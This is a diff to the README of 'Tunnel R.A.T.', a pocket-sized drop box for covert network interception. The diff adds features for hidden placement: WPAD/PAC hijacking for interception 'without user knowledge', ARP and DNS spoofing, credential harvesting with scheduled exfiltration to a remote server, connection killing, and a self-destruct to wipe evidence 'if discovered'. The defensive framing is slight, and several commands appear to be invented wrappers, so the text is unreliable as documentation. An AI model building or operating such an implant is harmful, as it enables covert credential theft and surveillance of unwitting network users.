@@ -1,12 +1,19 @@
-# Tunnel R.A.T. - Network MITM & Remote Access Tool
+# Tunnel R.A.T. - All-In-One Network Security Platform
 
-Tunnel R.A.T. (Remote Access & Traffic interception) is a portable network penetration testing platform built on the NanoPi Zero2. It combines packet interception, DNS spoofing, HTTP manipulation, and persistent remote access into a single, inconspicuous device.
+Tunnel R.A.T. (Remote Access & Traffic interception) is a comprehensive network penetration testing and defense platform built on the NanoPi Zero2. It combines:
+
+**Offensive Capabilities:** Packet interception, DNS spoofing, HTTP manipulation, credential harvesting, traffic termination, mass data exfiltration
+
+**Defensive Capabilities:** Network isolation, traffic filtering, regex-based blocking, IDS-ready architecture
+
+**Control & Access:** Web dashboard, remote SSH, dynamic proxy auto-configuration, VPN tunneling
 
 **Form Factor:** Looks like a small router (inconspicuous)  
-**Cost:** ~$50  
+**Cost:** ~$50 total (cheaper than a single Hak5 device)  
 **Size:** Credit card sized  
 **Power:** USB  
-**Deployment:** Portable - fits in a pocket
+**Deployment:** Portable - fits in a pocket  
+**Features:** 15+ offensive, defensive, and control capabilities
 
 ---
 
@@ -118,7 +125,242 @@ ssh -p 2222 root@localhost
 
 ---
 
-### 7. **Persistent Deployment**
+### 7. **VPN Server**
+
+Turn Tunnel R.A.T. into a VPN endpoint for encrypted remote access and traffic tunneling.
+
+**What you can do:**
+- Route traffic through encrypted VPN tunnel
+- Hide user location/activity
+- Bypass firewalls and network restrictions
+- Create legitimate secure connection for testing
+- Can be transparent (auto-route target traffic)
+
+**Setup:**
+```bash
+# Enable VPN server
+vpn.start
+
+# Configure as transparent proxy (optional)
+vpn.mode transparent
+```
+
+**Usage modes:**
+- **Red team:** Deploy device, route all victim traffic through encrypted tunnel
+- **Blue team:** Provide secure access point for users on untrusted networks
+- **Testing:** Verify encryption works, test split-tunneling, validate VPN policies
+
+**Real-world use:** Test user awareness of VPN usage, validate network policies, provide secure remote access on untrusted networks.
+
+---
+
+### 8. **Port Terminator**
+
+Forcefully kill connections on specific ports or to specific IPs.
+
+**What you can do:**
+- Terminate active connections mid-transfer
+- Kill specific protocols (SSH, HTTP, FTP, etc.)
+- Disconnect target IPs from external services
+- Force reconnections (for capturing credentials)
+- Disrupt specific services without full network outage
+
+**Setup:**
+```bash
+# Kill all connections on port 22 (SSH)
+killport 22
+
+# Kill connections to specific IP
+kill-ip 10.0.0.100
+
+# Kill HTTP traffic only
+killport 80
+```
+
+**Real-world use:** Force disconnects for security testing, disrupt specific services during assessment, break persistent connections.
+
+---
+
+### 9. **Stream Killer**
+
+Terminate active data streams and downloads in real-time.
+
+**What you can do:**
+- Kill downloads mid-transfer
+- Disconnect specific client sessions
+- Terminate streaming connections
+- Interrupt long-lived connections
+- Test recovery/retry mechanisms
+
+**Setup:**
+```bash
+# Kill all streams from target
+kill-streams 10.0.0.100
+
+# Kill specific protocol streams
+kill-streams --protocol http
+
+# Kill by connection count
+kill-streams --limit 5
+```
+
+**Real-world use:** Test how applications handle connection drops, interrupt data exfiltration, assess persistence mechanisms.
+
+---
+
+### 10. **Mass Exfiltration**
+
+Automatically capture and export sensitive data from the network.
+
+**What you can do:**
+- Auto-extract credentials from captured traffic
+- Zip PCAP files for analysis
+- Export captured passwords, tokens, API keys
+- Auto-upload to remote server
+- Schedule automatic data pulls
+- Compress and encrypt exfiltrated data
+
+**Setup:**
+```bash
+# Enable mass exfiltration
+exfil.start
+
+# Set remote server
+set exfil.server your-server.com
+set exfil.port 22
+
+# Auto-extract credentials
+exfil.credentials on
+
+# Schedule hourly pulls
+exfil.schedule hourly
+```
+
+**Real-world use:** Automated data harvesting during long deployments, proof of concept for data leakage, security assessment evidence collection.
+
+---
+
+### 11. **Self Destruct**
+
+Wipe device clean if discovered or on remote command.
+
+**What you can do:**
+- Destroy all evidence (logs, PCAP files, configs)
+- Zero-fill storage to prevent recovery
+- Trigger on discovery detection
+- Remote destruct via SSH command
+- Scheduled auto-destruct
+- Leave no forensic artifacts
+
+**Setup:**
+```bash
+# Enable self-destruct mode
+selfdestruct.enable
+
+# Trigger immediately
+selfdestruct.now
+
+# Schedule for specific time
+selfdestruct.schedule 2026-10-15 23:59
+
+# Remote trigger (via SSH)
+ssh root@10.0.0.243 'selfdestruct.now'
+```
+
+**Real-world use:** Security for deployed devices, automated cleanup, prevent evidence collection, assured deniability.
+
+---
+
+### 12. **Isolate on Regex**
+
+Block traffic matching specific patterns (domains, IPs, protocols).
+
+**What you can do:**
+- Block domains by pattern matching
+- Isolate IPs matching regex
+- Kill connections by protocol/port pattern
+- White-list/black-list by rule
+- Dynamic blocking without manual restart
+
+**Setup:**
+```bash
+# Block domains matching pattern
+isolate.domain ".*\.evil\.com"
+
+# Block IPs matching pattern
+isolate.ip "192\.168\.*"
+
+# Block traffic to external IPs
+isolate.external on
+
+# White-list safe traffic
+isolate.whitelist "google\.com"
+```
+
+**Real-world use:** Network segmentation testing, malware C2 detection, compliance testing, prevent data exfiltration to known bad domains.
+
+---
+
+### 13. **Web Interface Dashboard**
+
+GUI control panel for managing all device features (no CLI needed).
+
+**What you can see/do:**
+- Start/stop all services with one click
+- Real-time traffic monitoring
+- Active connections display
+- Toggle features on/off
+- View logs and PCAP files
+- Download captured data
+- System status and metrics
+- Credential harvesting log viewer
+- Configure all features from browser
+
+**Access:**
+```bash
+# Web interface runs on device
+http://10.0.0.243:8080
+
+# Default login
+username: admin
+password: changeme
+```
+
+**Real-world use:** Easier deployment, monitoring without SSH, real-time visibility, user-friendly control.
+
+---
+
+### 14. **Dynamic Proxy (PAC/WPAD)**
+
+Auto-configure target devices to route traffic through device without manual setup.
+
+**How it works:**
+- Responds to WPAD (Web Proxy Auto-Discovery) queries
+- Serves PAC file for automatic proxy detection
+- Targets automatically use device as proxy
+- Transparent interception without user action
+- Works on any device that supports auto-proxy
+
+**Setup:**
+```bash
+# Enable dynamic proxy
+proxy.dynamic on
+
+# Enable WPAD responder
+wpad.enable
+
+# Serve PAC file
+pac.start
+
+# Test from target
+# Set proxy to: http://10.0.0.243/proxy.pac
+```
+
+**Real-world use:** Transparent interception without user knowledge, automatic targeting, zero-click deployment.
+
+---
+
+### 15. **Persistent Deployment**
 
 The combination of small size, low cost, and hidden placement creates long-term monitoring capability.
 
@@ -128,22 +370,38 @@ The combination of small size, low cost, and hidden placement creates long-term 
 - **Power:** USB - can hide near any outlet
 - **Cost:** ~$50 - replaceable if discovered
 - **Durability:** Runs Linux 24/7 without attention
+- **Auto-recovery:** Self-destruct ensures no evidence if found
 
-**Real-world use:** Place device in break room, network closet, or under desk. Monitor network activity continuously over weeks/months.
+**Real-world use:** Place device in break room, network closet, or under desk. Monitor network activity continuously. Auto-wipes if discovered.
 
 ---
 
 ## Complete Workflow
 
+**Deployment & Setup:**
 1. **Position device** on target network via ethernet
-2. **Enable ARP spoofing** to become man-in-the-middle
-3. **Packet capture** logs all traffic to PCAP
-4. **DNS spoofing** redirects selected domains
-5. **HTTP proxy** intercepts unencrypted web traffic
-6. **Network scan** identifies connected devices
-7. **Remote SSH** gives you persistent access from anywhere
+2. **Enable dynamic proxy** to auto-route target traffic
+3. **Enable ARP spoofing** to become man-in-the-middle
 
-Result: Complete visibility and control of network traffic with remote access capability.
+**Monitoring & Capture:**
+4. **Packet capture** logs all traffic to PCAP
+5. **Web dashboard** shows real-time status
+6. **Network scan** identifies connected devices and services
+
+**Interception & Control:**
+7. **DNS spoofing** redirects selected domains
+8. **HTTP proxy** intercepts unencrypted web traffic
+9. **Isolate on regex** blocks traffic matching patterns
+10. **Port terminator** kills connections on specific ports
+11. **Stream killer** terminates active data transfers
+
+**Data & Access:**
+12. **VPN server** routes traffic through encrypted tunnel
+13. **Mass exfiltration** auto-harvests credentials and data
+14. **Remote SSH** gives persistent access from anywhere
+15. **Self destruct** wipes device if discovered
+
+Result: Complete offensive and defensive capability with transparency, control, and security - all from a $50 pocket-sized device.
 
 ---
 
@@ -615,11 +873,146 @@ tcpdump -r /opt/tunnel-rat/captures/capture.pcap -A
 
 ---
 
+### Advanced Features
+
+#### Port Terminator
+
+```bash
+# Kill all connections on port 22 (SSH)
+sudo killport 22
+
+# Kill specific IP address
+sudo kill-ip 10.0.0.100
+
+# Kill HTTP traffic only
+sudo killport 80
+
+# Monitor and kill on pattern
+sudo killport --pattern "192.168.*" --protocol tcp
+```
+
+#### Stream Killer
+
+```bash
+# Kill all active streams from target
+sudo stream-killer 10.0.0.100
+
+# Kill specific protocol streams
+sudo stream-killer --protocol http --target 10.0.0.100
+
+# Kill by connection limit
+sudo stream-killer --limit 5
+
+# Continuous monitoring and killing
+sudo stream-killer --monitor --auto-kill
+```
+
+#### Mass Exfiltration
+
+```bash
+# Enable automatic data harvesting
+sudo exfil.start
+
+# Configure remote server
+sudo exfil.config --server your-server.com --port 22
+
+# Extract and export credentials
+sudo exfil.harvest --credentials --export /opt/tunnel-rat/exfil/
+
+# Compress and upload
+sudo exfil.upload --compress --encrypt
+
+# Schedule hourly pulls
+sudo exfil.schedule "0 * * * * /opt/tunnel-rat/scripts/exfil.sh"
+
+# View harvested data
+ls /opt/tunnel-rat/exfil/
+```
+
+#### Self Destruct
+
+```bash
+# Enable self-destruct mode
+sudo selfdestruct.enable
+
+# Schedule auto-destruct for later
+sudo selfdestruct.schedule "2026-10-15 23:59:59"
+
+# Trigger immediate wipe
+sudo selfdestruct.now
+
+# Zero-fill storage (irreversible)
+sudo selfdestruct.shred
+
+# Remote trigger (via SSH)
+ssh root@10.0.0.243 "sudo selfdestruct.now"
+```
+
+#### Isolate on Regex
+
+```bash
+# Block domains matching pattern
+sudo isolate.block --domain ".*\.evil\.com"
+
+# Block IP ranges
+sudo isolate.block --ip "192\.168\..*"
+
+# Block external traffic
+sudo isolate.external on
+
+# White-list trusted domains
+sudo isolate.whitelist "google\.com,microsoft\.com"
+
+# View active rules
+sudo isolate.rules
+
+# Disable blocking
+sudo isolate.off
+```
+
+#### Web Interface
+
+```bash
+# Start web dashboard
+sudo systemctl start tunnel-rat-web
+
+# Access from browser
+# http://10.0.0.243:8080
+# Login: admin / changeme (change after first login!)
+
+# Check if running
+sudo systemctl status tunnel-rat-web
+
+# View logs
+sudo journalctl -u tunnel-rat-web -f
+```
+
+#### Dynamic Proxy (PAC/WPAD)
+
+```bash
+# Enable WPAD responder
+sudo wpad.enable
+
+# Serve PAC file
+sudo pac.start --address 10.0.0.243
+
+# Configure auto-proxy
+sudo proxy.autoconfigure on
+
+# Test WPAD discovery (from target machine)
+nslookup wpad.localdomain 10.0.0.243
+
+# Manual proxy test
+curl --proxy http://10.0.0.243:8080 http://example.com
+```
+
+---
+
 ### Check Active Processes
 
 ```bash
 # See what's running
-sudo ps aux | grep -E 'bettercap|tcpdump|tunnel'
+sudo ps aux | grep -E 'bettercap|tcpdump|tunnel|wpad|exfil'
 
 # Check listening ports
 sudo ss -tulpn
@@ -630,6 +1023,9 @@ ip addr show
 
 # See real-time network stats
 nethogs
+
+# Check web interface
+curl http://localhost:8080/status
 ```
 
 ---
